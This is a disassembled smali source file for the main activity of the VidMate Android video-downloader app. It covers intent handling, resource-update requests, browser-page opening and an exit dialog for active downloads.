.class public Lcom/nemo/vidmate/MainActivity;
.super Lcom/nemo/vidmate/BaseMainActivity;

# interfaces
.implements Lcom/nemo/vidmate/k$a;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/nemo/vidmate/MainActivity$a;,
        Lcom/nemo/vidmate/MainActivity$b;
    }
.end annotation


# instance fields
.field private n:Lcom/nemo/vidmate/home/aj;

.field private o:Lcom/nemo/vidmate/download/a/ai;

.field private p:Lcom/nemo/vidmate/browser/b/a;

.field private q:Lcom/nemo/vidmate/l/y;

.field private r:Lcom/nemo/vidmate/zapya/f;

.field private s:Lcom/nostra13/universalimageloader/core/ImageLoader;

.field private t:Lcom/nemo/vidmate/d/e;

.field private u:J

.field private v:J


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const-wide/16 v0, 0x0

    .line 70
    invoke-direct {p0}, Lcom/nemo/vidmate/BaseMainActivity;-><init>()V

    .line 87
    iput-wide v0, p0, Lcom/nemo/vidmate/MainActivity;->u:J

    .line 517
    iput-wide v0, p0, Lcom/nemo/vidmate/MainActivity;->v:J

    .line 730
    return-void
.end method

.method private a(Landroid/content/Intent;)V
    .locals 1

    .prologue
    .line 212
    if-nez p1, :cond_0

    .line 216
    :goto_0
    return-void

    .line 214
    :cond_0
    new-instance v0, Lcom/nemo/vidmate/k;

    invoke-direct {v0, p0, p1, p0}, Lcom/nemo/vidmate/k;-><init>(Landroid/content/Context;Landroid/content/Intent;Lcom/nemo/vidmate/k$a;)V

    .line 215
    invoke-virtual {v0}, Lcom/nemo/vidmate/k;->a()V

    goto :goto_0
.end method

.method static synthetic a(Lcom/nemo/vidmate/MainActivity;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 70
    invoke-direct {p0, p1, p2}, Lcom/nemo/vidmate/MainActivity;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .prologue
    .line 703
    new-instance v0, Lcom/nemo/vidmate/h/j;

    invoke-direct {v0}, Lcom/nemo/vidmate/h/j;-><init>()V

    .line 704
    const-string v1, "url_movie_resource_update"

    const/4 v2, 0x0

    new-instance v3, Lcom/nemo/vidmate/i;

    invoke-direct {v3, p0}, Lcom/nemo/vidmate/i;-><init>(Lcom/nemo/vidmate/MainActivity;)V

    invoke-virtual {v0, v1, v2, v3}, Lcom/nemo/vidmate/h/j;->a(Ljava/lang/String;ILcom/nemo/vidmate/h/j$a;)V

    .line 711
    iget-object v1, v0, Lcom/nemo/vidmate/h/j;->f:Lcom/nemo/vidmate/utils/bl;

    const-string v2, "resource_id"

    invoke-virtual {v1, v2, p1}, Lcom/nemo/vidmate/utils/bl;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 712
    iget-object v1, v0, Lcom/nemo/vidmate/h/j;->f:Lcom/nemo/vidmate/utils/bl;

    const-string v2, "type"

    invoke-virtual {v1, v2, p2}, Lcom/nemo/vidmate/utils/bl;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 713
    invoke-virtual {v0}, Lcom/nemo/vidmate/h/j;->b()V

    .line 714
    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 10

    .prologue
    .line 342
    const-string v0, "{\"referer\":\"%s\", \"imdb_id\":\"%s\"}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    const/4 v2, 0x1

    aput-object p4, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    move-object v0, p0

    move-object v1, p1

    move-object v3, p3

    move-object v4, p4

    move-object v5, p5

    move-object/from16 v6, p6

    move-object/from16 v7, p7

    move-object/from16 v8, p8

    move-object/from16 v9, p9

    .line 345
    invoke-static/range {v0 .. v9}, Lcom/nemo/vidmate/browser/a/i;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 348
    return-void
.end method

.method private b(Landroid/content/Intent;)V
    .locals 2

    .prologue
    .line 220
    :try_start_0
    const-string v0, "notification"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 221
    if-eqz v0, :cond_0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 222
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/nemo/vidmate/player/music/MusicPlayerActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 223
    invoke-virtual {p0, v0}, Lcom/nemo/vidmate/MainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 228
    :cond_0
    :goto_0
    return-void

    .line 225
    :catch_0
    move-exception v0

    .line 226
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method static synthetic b(Lcom/nemo/vidmate/MainActivity;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 70
    invoke-direct {p0, p1, p2}, Lcom/nemo/vidmate/MainActivity;->b(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private b(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .prologue
    .line 717
    new-instance v0, Lcom/nemo/vidmate/h/j;

    invoke-direct {v0}, Lcom/nemo/vidmate/h/j;-><init>()V

    .line 718
    const-string v1, "url_music_resource_update"

    const/4 v2, 0x0

    new-instance v3, Lcom/nemo/vidmate/j;

    invoke-direct {v3, p0}, Lcom/nemo/vidmate/j;-><init>(Lcom/nemo/vidmate/MainActivity;)V

    invoke-virtual {v0, v1, v2, v3}, Lcom/nemo/vidmate/h/j;->a(Ljava/lang/String;ILcom/nemo/vidmate/h/j$a;)V

    .line 725
    iget-object v1, v0, Lcom/nemo/vidmate/h/j;->f:Lcom/nemo/vidmate/utils/bl;

    const-string v2, "song_id"

    invoke-virtual {v1, v2, p1}, Lcom/nemo/vidmate/utils/bl;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 726
    iget-object v1, v0, Lcom/nemo/vidmate/h/j;->f:Lcom/nemo/vidmate/utils/bl;

    const-string v2, "type"

    invoke-virtual {v1, v2, p2}, Lcom/nemo/vidmate/utils/bl;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 727
    invoke-virtual {v0}, Lcom/nemo/vidmate/h/j;->b()V

    .line 728
    return-void
.end method

.method private d(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 232
    if-eqz p1, :cond_1

    .line 233
    :try_start_0
    const-string v0, "vidaos.Done"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 234
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/download/a/ai;->g()Z

    move-result v0

    if-nez v0, :cond_0

    .line 235
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/download/a/ai;->a(Z)V

    .line 238
    :cond_0
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/download/a/ai;->b(I)V

    .line 251
    :cond_1
    :goto_0
    return-void

    .line 239
    :cond_2
    const-string v0, "vidaos.Tasks"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 240
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/download/a/ai;->g()Z

    move-result v0

    if-nez v0, :cond_3

    .line 241
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/download/a/ai;->a(Z)V

    .line 244
    :cond_3
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->g()Lcom/nemo/vidmate/download/a/ai;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/download/a/ai;->b(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 248
    :catch_0
    move-exception v0

    .line 249
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private l()V
    .locals 4

    .prologue
    .line 182
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/nemo/vidmate/b;

    invoke-direct {v1, p0}, Lcom/nemo/vidmate/b;-><init>(Lcom/nemo/vidmate/MainActivity;)V

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 191
    return-void
.end method


# virtual methods
.method public a(Lcom/nemo/vidmate/l/y$b;Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 487
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->h()Lcom/nemo/vidmate/l/y;

    move-result-object v0

    .line 488
    invoke-virtual {v0, p1}, Lcom/nemo/vidmate/l/y;->a(Lcom/nemo/vidmate/l/y$b;)V

    .line 489
    invoke-virtual {v0, p2}, Lcom/nemo/vidmate/l/y;->a(Ljava/lang/String;)V

    .line 490
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/l/y;->a(Z)V

    .line 491
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;)V
    .locals 7

    .prologue
    const/4 v3, 0x0

    .line 319
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v4, v3

    move-object v5, p3

    move-object v6, v3

    invoke-static/range {v0 .. v6}, Lcom/nemo/vidmate/browser/a/i;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 321
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 7

    .prologue
    .line 326
    const-string v0, "{\"referer\":\"%s\"}"

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    move-object v0, p0

    move-object v1, p1

    move-object v3, p3

    move-object v4, p4

    move-object v5, p5

    move-object v6, p6

    .line 327
    invoke-static/range {v0 .. v6}, Lcom/nemo/vidmate/browser/a/i;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 329
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 7

    .prologue
    .line 353
    const-string v0, "{\"referer\":\"%s\", \"eps_id\":\"%s\"}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p2, v1, v2

    const/4 v2, 0x1

    aput-object p5, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 355
    const/4 v5, 0x0

    move-object v0, p0

    move-object v1, p1

    move-object v3, p3

    move-object v4, p4

    move-object v6, p6

    invoke-static/range {v0 .. v6}, Lcom/nemo/vidmate/browser/a/i;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 357
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 10

    .prologue
    .line 680
    new-instance v8, Lcom/nemo/vidmate/g;

    invoke-direct {v8, p0, p1}, Lcom/nemo/vidmate/g;-><init>(Lcom/nemo/vidmate/MainActivity;Ljava/lang/String;)V

    move-object v0, p0

    move-object v1, p2

    move-object v2, p3

    move-object v3, p4

    move-object v4, p5

    move-object/from16 v5, p6

    move-object/from16 v6, p7

    move-object v7, p1

    move-object/from16 v9, p8

    invoke-direct/range {v0 .. v9}, Lcom/nemo/vidmate/MainActivity;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 688
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;)V
    .locals 7

    .prologue
    .line 365
    const/4 v6, 0x0

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move-object v4, p4

    move-object v5, p5

    invoke-virtual/range {v0 .. v6}, Lcom/nemo/vidmate/MainActivity;->a(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Z)V

    .line 366
    return-void
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Z)V
    .locals 4

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 371
    if-eqz p5, :cond_2

    const-string v0, ""

    invoke-virtual {p5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 372
    const-string v0, "{\"referer\":\"%s\", \"value\":\"%s\"}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p4, v1, v2

    aput-object p5, v1, v3

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 378
    :goto_0
    iget-object v1, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    if-nez v1, :cond_0

    .line 379
    new-instance v1, Lcom/nemo/vidmate/browser/b/a;

    invoke-direct {v1, p0}, Lcom/nemo/vidmate/browser/b/a;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    .line 381
    :cond_0
    if-nez p3, :cond_1

    .line 382
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->f()Lcom/nemo/vidmate/home/aj;

    move-result-object v1

    invoke-virtual {v1}, Lcom/nemo/vidmate/home/aj;->l()V

    .line 384
    :cond_1
    iget-object v1, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v1, v2}, Lcom/nemo/vidmate/browser/b/a;->a(Z)V

    .line 385
    iget-object v1, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v1, p1, p2, v0, p6}, Lcom/nemo/vidmate/browser/b/a;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 402
    return-void

    .line 375
    :cond_2
    const-string v0, "{\"referer\":\"%s\"}"

    new-array v1, v3, [Ljava/lang/Object;

    aput-object p4, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0
.end method

.method public b(Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 360
    invoke-static {p1}, Lcom/nemo/vidmate/browser/a/i;->a(Ljava/lang/String;)V

    .line 361
    return-void
.end method

.method public b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 0

    .prologue
    .line 334
    invoke-static/range {p0 .. p6}, Lcom/nemo/vidmate/browser/a/i;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 336
    return-void
.end method

.method public b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/utils/av$b;)V
    .locals 7

    .prologue
    .line 693
    new-instance v5, Lcom/nemo/vidmate/h;

    invoke-direct {v5, p0, p1}, Lcom/nemo/vidmate/h;-><init>(Lcom/nemo/vidmate/MainActivity;Ljava/lang/String;)V

    move-object v0, p0

    move-object v1, p2

    move-object v2, p3

    move-object v3, p4

    move-object v4, p5

    move-object v6, p6

    invoke-virtual/range {v0 .. v6}, Lcom/nemo/vidmate/MainActivity;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/nemo/vidmate/MainActivity$b;Lcom/nemo/vidmate/utils/av$b;)V

    .line 700
    return-void
.end method

.method public b(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Z)V
    .locals 6

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 407
    if-eqz p5, :cond_2

    const-string v0, ""

    invoke-virtual {p5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 408
    const-string v0, "{\"referer\":\"%s\", \"value\":\"%s\"}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p4, v1, v2

    aput-object p5, v1, v3

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 414
    :goto_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    if-nez v0, :cond_0

    .line 415
    new-instance v0, Lcom/nemo/vidmate/browser/b/a;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/browser/b/a;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    .line 417
    :cond_0
    if-nez p3, :cond_1

    .line 418
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->f()Lcom/nemo/vidmate/home/aj;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/home/aj;->l()V

    .line 420
    :cond_1
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v0, v2}, Lcom/nemo/vidmate/browser/b/a;->a(Z)V

    .line 421
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    const/4 v5, -0x1

    move-object v1, p1

    move-object v2, p2

    move v4, p6

    invoke-virtual/range {v0 .. v5}, Lcom/nemo/vidmate/browser/b/a;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZI)V

    .line 422
    return-void

    .line 411
    :cond_2
    const-string v0, "{\"referer\":\"%s\"}"

    new-array v1, v3, [Ljava/lang/Object;

    aput-object p4, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    goto :goto_0
.end method

.method public b(Z)V
    .locals 7

    .prologue
    const/4 v6, 0x0

    const/4 v5, 0x1

    .line 519
    invoke-static {}, Lcom/nemo/vidmate/download/a;->a()Lcom/nemo/vidmate/download/a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/download/a;->c()Z

    move-result v1

    .line 520
    if-eqz p1, :cond_1

    if-nez v1, :cond_1

    .line 521
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/nemo/vidmate/MainActivity;->v:J

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x7d0

    cmp-long v0, v0, v2

    if-lez v0, :cond_0

    .line 522
    const v0, 0x7f050059

    invoke-static {p0, v0, v6}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 524
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/nemo/vidmate/MainActivity;->v:J

    .line 605
    :goto_0
    return-void

    .line 526
    :cond_0
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->finish()V

    goto :goto_0

    .line 530
    :cond_1
    invoke-static {p0}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v0

    const v2, 0x7f030039

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v2

    .line 531
    const v0, 0x7f07007a

    invoke-virtual {v2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    .line 532
    const v0, 0x7f07007b

    invoke-virtual {v2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/CheckBox;

    .line 533
    if-eqz v1, :cond_2

    .line 534
    const-string v4, "keep_download"

    invoke-static {v4, v5}, Lcom/nemo/vidmate/utils/bv;->a(Ljava/lang/String;Z)Z

    move-result v4

    .line 536
    invoke-virtual {v0, v4}, Landroid/widget/CheckBox;->setChecked(Z)V

    .line 537
    invoke-virtual {v3, v6}, Landroid/view/View;->setVisibility(I)V

    .line 542
    :goto_1
    new-instance v3, Lcom/nemo/vidmate/c;

    invoke-direct {v3, p0}, Lcom/nemo/vidmate/c;-><init>(Lcom/nemo/vidmate/MainActivity;)V

    invoke-virtual {v0, v3}, Landroid/widget/CheckBox;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    .line 550
    new-instance v0, Lcom/nemo/vidmate/d;

    const v3, 0x7f0b0004

    invoke-direct {v0, p0, p0, v3}, Lcom/nemo/vidmate/d;-><init>(Lcom/nemo/vidmate/MainActivity;Landroid/content/Context;I)V

    .line 560
    invoke-virtual {v0, v5}, Landroid/app/Dialog;->requestWindowFeature(I)Z

    .line 561
    invoke-virtual {v0, v5}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 562
    invoke-virtual {v0, v5}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 563
    invoke-virtual {v0, v2}, Landroid/app/Dialog;->setContentView(Landroid/view/View;)V

    .line 565
    const v3, 0x7f070027

    invoke-virtual {v2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    new-instance v4, Lcom/nemo/vidmate/e;

    invoke-direct {v4, p0, v0}, Lcom/nemo/vidmate/e;-><init>(Lcom/nemo/vidmate/MainActivity;Landroid/app/Dialog;)V

    invoke-virtual {v3, v4}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 573
    const v3, 0x7f07007d

    invoke-virtual {v2, v3}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    new-instance v3, Lcom/nemo/vidmate/f;

    invoke-direct {v3, p0, v1, v0}, Lcom/nemo/vidmate/f;-><init>(Lcom/nemo/vidmate/MainActivity;ZLandroid/app/Dialog;)V

    invoke-virtual {v2, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 599
    new-instance v1, Landroid/util/DisplayMetrics;

    invoke-direct {v1}, Landroid/util/DisplayMetrics;-><init>()V

    .line 600
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v2

    invoke-interface {v2}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v2

    invoke-virtual {v2, v1}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    .line 601
    invoke-virtual {v0}, Landroid/app/Dialog;->getWindow()Landroid/view/Window;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v2

    .line 602
    iget v1, v1, Landroid/util/DisplayMetrics;->widthPixels:I

    int-to-double v3, v1

    const-wide v5, 0x3feccccccccccccdL    # 0.9

    mul-double/2addr v3, v5

    double-to-int v1, v3

    iput v1, v2, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 604
    invoke-virtual {v0}, Landroid/app/Dialog;->show()V

    goto/16 :goto_0

    .line 539
    :cond_2
    const/16 v4, 0x8

    invoke-virtual {v3, v4}, Landroid/view/View;->setVisibility(I)V

    goto :goto_1
.end method

.method public c(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 500
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->i()Lcom/nemo/vidmate/d/e;

    move-result-object v0

    .line 501
    invoke-virtual {v0, p1}, Lcom/nemo/vidmate/d/e;->a(Ljava/lang/String;)V

    .line 502
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/d/e;->a(Z)V

    .line 503
    return-void
.end method

.method public c(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;Z)V
    .locals 6

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 427
    if-eqz p5, :cond_3

    const-string v0, ""

    invoke-virtual {p5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 428
    const-string v0, "{\"referer\":\"%s\", \"value\":\"%s\"}"

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    aput-object p4, v1, v2

    aput-object p5, v1, v3

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 434
    :goto_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    if-nez v0, :cond_0

    .line 435
    new-instance v0, Lcom/nemo/vidmate/browser/b/a;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/browser/b/a;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    .line 437
    :cond_0
    if-nez p3, :cond_1

    .line 438
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->f()Lcom/nemo/vidmate/home/aj;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/home/aj;->l()V

    .line 440
    :cond_1
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v0, v2}, Lcom/nemo/vidmate/browser/b/a;->a(Z)V

    .line 441
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v0}, Lcom/nemo/vidmate/browser/b/a;->r()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 442
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    iget-object v1, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v1}, Lcom/nemo/vidmate/browser/b/a;->q()I

    move-result v1

    invoke-virtual {v0, v1, v2}, Lcom/nemo/vidmate/browser/b/a;->a(IZ)V

    .line 444
    :cond_2
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    const/4 v5, -0x1

    move-object v1, p1

    move-object v2, p2

    move v4, p6

    invoke-virtual/range {v0 .. v5}, Lcom/nemo/vidmate/browser/b/a;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ZI)V

    .line 445
    return-void

    .line 431
    :cond_3
    const-string v0, "{\"referer\":\"%s\"}"

    new-array v1, v3, [Ljava/lang/Object;

    aput-object p4, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    goto :goto_0
.end method

